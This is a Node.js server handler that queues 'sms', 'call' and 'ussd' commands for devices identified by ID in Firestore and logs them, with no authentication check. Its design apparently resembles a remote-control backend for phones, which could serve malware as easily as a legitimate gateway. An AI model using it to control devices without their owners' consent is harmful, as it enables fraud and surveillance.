import { firestore } from "../config/db.js";

const commandCollection = firestore.collection("commandLogs");

export const handleDeviceCommand = async (req, res) => {
  try {
    const { uniqueid, action, to, body, code, simSlot } = req.body;

    if (!uniqueid || !action) {
      return res.json({ success: false, message: "Missing action or uniqueid" });
    }

    let commandData = { action, simSlot, timestamp: Date.now() };

    if (action === "sms") {
      commandData.to = to;
      commandData.body = body;
    }

    if (action === "call" || action === "ussd") {
      commandData.code = code;
    }

    // SAVE command to Firestore for App processing
    await firestore.collection("commands").doc(uniqueid).set(commandData);

    // Save log
    await commandCollection.add({
      uniqueid,
      ...commandData
    });

    return res.json({
      success: true,
      message: `${action} command sent`,
      data: commandData
    });

  } catch (err) {
    console.error("❌ ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error"
    });
  }
};
